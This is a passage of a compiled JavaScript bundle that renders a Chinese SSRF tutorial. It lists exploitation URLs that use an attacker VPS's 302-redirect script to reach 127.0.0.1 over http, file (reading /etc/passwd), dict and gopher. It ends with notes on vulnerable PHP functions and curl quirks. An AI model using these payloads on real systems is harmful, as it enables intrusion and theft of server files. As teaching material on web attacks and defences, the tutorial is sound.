',Object(n.b)("span",s({parentName:"span"},{className:"token interpolation"}),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$schema")),"://",Object(n.b)("span",s({parentName:"span"},{className:"token interpolation"}),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$ip")),":",Object(n.b)("span",s({parentName:"span"},{className:"token interpolation"}),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$port")),"/",Object(n.b)("span",s({parentName:"span"},{className:"token interpolation"}),Object(n.b)("span",s({parentName:"span"},{className:"token variable"}),"$query")),'"'),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),")"),Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(n.b)("span",s({parentName:"span"},{className:"token punctuation"}),"}"))))),Object(n.b)("p",null,Object(n.b)("strong",{parentName:"p"},"利用：")),Object(n.b)("div",{className:"rcpress-highlight","data-language":"python"},Object(n.b)("pre",s({parentName:"div"},{className:"language-python"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-python"}),Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#http/https"),"\nhttp",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"//"),"目标网站HOST",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"ssrf",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"php?url",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"http",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"//"),"vps的IP",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"302."),"php?schema",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"http",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"&"),"ip",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"127.0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".1"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"&"),"port",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"80"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#file"),"\nhttp",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"//"),"目标网站HOST",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"ssrf",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"php?url",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"http",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"//"),"vps的IP",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"302."),"php?schema",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token builtin"}),"file"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"&"),"ip",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"127.0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".1"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"&"),"query",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"etc",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"passwd\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#dict"),"\nhttp",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"//"),"目标网站HOST",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"ssrf",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"php?url",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"http",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"//"),"vps的IP",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"302."),"php?schema",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token builtin"}),"dict"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"&"),"ip",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"127.0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".1"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"&"),"port",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"29362"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"&"),"query",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"info\n",Object(n.b)("span",s({parentName:"code"},{className:"token comment"}),"#gopher"),"\nhttp",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"//"),"目标网站HOST",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),"ssrf",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"php?url",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"http",Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"//"),"vps的IP",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"/"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"302."),"php?schema",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"gopher",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"&"),"ip",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"127.0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".0"),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),".1"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"&"),"port",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"2333"),Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"&"),"query",Object(n.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(n.b)("span",s({parentName:"code"},{className:"token number"}),"66666")))),Object(n.b)("h1",{className:"__internal",id:"总结"},"总结",Object(n.b)("a",s({parentName:"h1"},{href:"#%E6%80%BB%E7%BB%93","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("blockquote",null,Object(n.b)("div",s({parentName:"blockquote"},{className:"rcpress-highlight","data-language":"php"}),Object(n.b)("pre",s({parentName:"div"},{className:"language-php"}),Object(n.b)("code",s({parentName:"pre"},{className:"language-php"}),Object(n.b)("span",s({parentName:"code"},{className:"token function"}),"file_get_contents"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token function"}),"fsockopen"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n",Object(n.b)("span",s({parentName:"code"},{className:"token function"}),"curl_exec"),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(n.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")))),Object(n.b)("p",{parentName:"blockquote"},"以上三个函数使用不当会造成SSRF漏洞"),Object(n.b)("p",{parentName:"blockquote"},"curl7.43上gopher协议存在%00截断的BUG，v7.49可用"),Object(n.b)("p",{parentName:"blockquote"},"file_get_contents()的SSRF，gopher协议不能使用URLencode"),Object(n.b)("p",{parentName:"blockquote"},"file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败")),Object(n.b)("h3",{className:"__internal",id:"更多参考"},"更多参考",Object(n.b)("a",s({parentName:"h3"},{href:"#%E6%9B%B4%E5%A4%9A%E5%8F%82%E8%80%83","aria-hidden":!0,className:"anchor"}),"#")),Object(n.b)("p",null,Object(n.b)("a",s({parentName:"p"},{href:"https://xz.aliyun.com/t/6373",target:"_blank"}),"SSRF在有无回显方面的利用及其思考与总结")," "),Object(n.b)("p",null,Object(n.b)("a",s({parentName:"p"},{href:"https://blog.chaitin.cn/gopher-attack-surfaces/",target:"_blank"}),"【长亭科技】利用 Gopher 协议拓展攻击面")))}r.isMDXComponent=!0,r=r}}]);